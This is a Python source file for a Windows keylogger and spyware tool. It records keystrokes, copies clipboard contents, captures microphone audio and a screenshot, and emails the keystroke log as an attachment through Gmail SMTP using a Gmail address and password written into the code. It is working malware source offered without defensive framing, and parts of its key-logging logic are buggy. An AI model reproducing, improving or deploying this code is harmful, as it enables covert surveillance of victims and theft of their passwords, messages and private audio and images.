from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket 
import platform
 
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process , freeze_support
from PIL import ImageGrab

system_information ="system.info.txt"
clipboard_information="clipboard.txt"
audio_information = "audio.wav"
microphone_time=10
screenshot_information = "screen.png"
email_address ="unk.nown.py88@gmail.com"
password ="SAYMYNAME0905"
to_address="unk.nown.py88@gmail.com"

keys_information = "test.txt"
file_path="C:\\Users\\unknown\\Desktop\\keylog"
extend ="\\"

def send_email(filename, attachment, to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From']= from_address
    msg['To']= to_address
    msg['Subject'] = 'Log File'
    body = "Body of the Email"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "Attactment ; filename = %s"%filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()

send_email(keys_information, file_path+extend+keys_information,to_address)

def copy_clipboard():
    with open(file_path+extend+clipboard_information,'a')as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data: \n"+pasted_data)
        except:
            f.write("Clipboard couldn't copy")
copy_clipboard()
def microphone():
    fs = 44100
    seconds = microphone_time
    my_recording = sd.rec(int(seconds *fs),samplerate=fs, channels=2)
    sd.wait()
    write(file_path+extend+audio_information,fs, my_recording)
microphone()
def screenshot():
    image = ImageGrab.grab()
    image.save(file_path+extend+ screenshot_information)
screenshot()
count = 0
keys = []

def on_press(key):
    global keys , count
    print(key)
    keys.append(key)
    count += 1

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("Key.enter") > 0 :
                f.write('\n')
                f.close()
            if k.find("Key.space"):
                f.write(' ')
                f.close()
            if k.find("Key.caps_lock"):
                f.write('capslock')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release=on_release)as listener :
    listener.join() 
